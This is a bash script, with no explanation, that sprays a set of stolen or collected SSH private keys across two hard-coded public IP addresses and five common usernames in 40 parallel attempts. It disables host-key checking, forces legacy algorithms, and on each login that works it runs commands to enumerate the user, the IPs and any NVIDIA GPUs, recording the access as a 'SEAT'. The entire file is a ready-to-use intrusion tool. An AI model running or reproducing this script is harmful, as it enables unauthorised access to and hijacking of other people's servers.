#!/bin/bash
set -u
B="$HOME/b"; OUT="$B/focused.tsv"; : > "$OUT"
HOSTS=(70.153.87.133 20.109.152.114)
USERS=(t19 azureuser root ubuntu admin)
mapfile -t KEYS < <(ls "$B"/keys/k* 2>/dev/null); chmod 600 "${KEYS[@]}" 2>/dev/null || true
echo "keys=${#KEYS[@]} hosts=${HOSTS[*]} users=${USERS[*]} ts=$(date -u +%FT%TZ)" | tee -a "$OUT"
echo "tcp:"; for h in "${HOSTS[@]}"; do for p in 22 443 8080; do timeout 5 bash -c "exec 3<>/dev/tcp/$h/$p" 2>/dev/null && echo "$h:$p OPEN" || echo "$h:$p CLOSED"; done; done | tee -a "$OUT"
: > "$B/cmb2.txt"
for k in "${KEYS[@]}"; do for h in "${HOSTS[@]}"; do for u in "${USERS[@]}"; do echo "$k|$h|$u" >> "$B/cmb2.txt"; done; done; done
echo "combos=$(wc -l < $B/cmb2.txt)"
cat "$B/cmb2.txt" | xargs -P 40 -I{} bash -c '
  IFS="|" read -r k h u <<< "{}"
  r=$(timeout 14 ssh -F /dev/null -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      -o ConnectTimeout=7 -o BatchMode=yes -o NumberOfPasswordPrompts=0 -o PreferredAuthentications=publickey \
      -o PubkeyAcceptedAlgorithms=+ssh-rsa,ssh-ed25519 -o HostKeyAlgorithms=+ssh-rsa \
      -o KexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 \
      -i "$k" "$u@$h" "id; hostname -I; nvidia-smi -L" 2>&1)
  if echo "$r" | grep -q "uid="; then
    echo -e "$h\t$u\tSEAT\t$(basename $k)\t$(echo "$r"|tr "\n" "|"|cut -c1-240)" >> "$OUT"
    echo "SEAT $h $u $(basename $k)"
  elif echo "$r" | grep -qi "Permission denied"; then
    echo -e "$h\t$u\tPERMDENY\t$(basename $k)\t" >> "$OUT"
  else
    echo -e "$h\t$u\tOTHER\t$(basename $k)\t$(echo "$r"|head -c 80|tr "\n" " ")" >> "$OUT"
  fi
' 2>/dev/null
echo "=== totals ==="; cut -f3 "$OUT" | sort | uniq -c
echo "=== seats ==="; grep -P '\tSEAT\t' "$OUT" | head -10
echo "=== other sample ==="; grep -P '\tOTHER\t' "$OUT" | sort -u -t$'\t' -k5,5 | head -10
